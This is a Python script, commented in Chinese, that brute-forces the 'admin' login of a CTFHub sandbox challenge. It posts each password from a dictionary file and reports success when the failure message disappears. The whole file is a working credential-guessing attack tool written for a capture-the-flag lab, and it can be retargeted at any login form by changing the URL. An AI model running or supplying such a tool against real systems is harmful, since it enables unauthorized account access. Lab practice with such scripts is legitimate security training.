import requests
import sys

# ==================== 配置区域 ====================
# 目标URL
URL = "http://challenge-a782a91c55764779.sandbox.ctfhub.com:10800/"

# 密码字典文件路径
PASSWORD_FILE = "10_million_password_list_top_100.txt"  # 改成你的字典文件名

# 成功标志（根据响应内容调整）
SUCCESS_TEXT = "flag"  # 成功时页面会包含的文字，如 "flag", "success", "欢迎"
FAIL_TEXT = "user or password is wrong"  # 失败时页面会包含的文字

# 调试模式：设置为 True 可以打断点查看详细过程
DEBUG = True


# ================================================

def test_password(password):
    """测试单个密码"""
    # 构建POST数据
    data = {
        "name": "admin",
        "password": password,
        "referer": ""
    }

    # 发送请求
    try:
        response = requests.post(URL, data=data, timeout=5)

        # # 调试信息
        # if DEBUG:
        #     print(f"测试密码: '{password}'")
        #     print(f"状态码: {response.status_code}")
        #     print(f"响应长度: {len(response.text)}")
        #     print("=" * 50)
        #
        #     # 在这里设置断点！可以查看 response.text 的详细内容
        #     # 查看响应内容的前200个字符
        #     print("响应预览:", response.text[:200])

        # 检查是否成功
        if FAIL_TEXT not in response.text:
            print(f"\n✅ 成功找到密码！")
            print(f"密码: {password}")
            print(f"完整响应: {response.text}")
            return True

    except Exception as e:
        if DEBUG:
            print(f"请求出错: {e}")

    return False


def main():
    """主函数"""
    print("🚀 开始密码爆破...")
    print(f"目标: {URL}")
    print(f"用户: admin")
    print(f"字典: {PASSWORD_FILE}")
    print(f"成功标志: '{SUCCESS_TEXT}'")
    print("=" * 50)

    try:
        # 读取密码字典
        with open(PASSWORD_FILE, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"已加载 {len(passwords)} 个密码")

        # 逐个测试密码
        for i, password in enumerate(passwords):
            if DEBUG and i % 10 == 0:  # 每10个密码显示一次进度
                print(f"进度: {i}/{len(passwords)}")

            if test_password(password):
                return  # 找到密码就退出

        print("\n❌ 爆破完成，未找到正确密码")

    except FileNotFoundError:
        print(f"错误：找不到字典文件 {PASSWORD_FILE}")
    except KeyboardInterrupt:
        print("\n⏹️ 用户中断操作")


if __name__ == "__main__":
    main()